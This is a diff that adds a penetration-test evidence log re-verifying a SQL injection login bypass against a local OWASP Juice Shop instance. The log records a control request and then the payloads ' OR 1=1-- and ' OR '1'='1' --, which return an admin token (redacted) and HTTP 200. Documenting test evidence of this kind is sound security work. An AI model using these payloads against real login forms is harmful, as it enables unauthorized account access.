@@ -1,0 +1,16 @@
+# EVID-REVERIFY-001
+# Phase 10 current-instance re-verification
+# Candidate: C1 = SQL Injection authentication bypass
+# Historical: evidence/requests/WEB-VUL-001-request.txt + responses/WEB-VUL-001-response.txt
+# Target: POST http://127.0.0.1:3000/rest/user/login
+# Date/Time: 2026-10-03T21:06:54+05:30
+# Method: curl (executed)
+
+--- CONTROL: invalid credentials (expected 401) ---
+Invalid email or password.
+HTTP:401
+--- TEST: historical payload ' OR 1=1-- (tokens redacted) ---
+{"authentication":{"token":"[REDACTED-JWT]","bid":1,"umail":"admin@juice-sh.op"}}
+--- TEST: variant ' OR '1'='1' -- ---
+
+HTTP:200
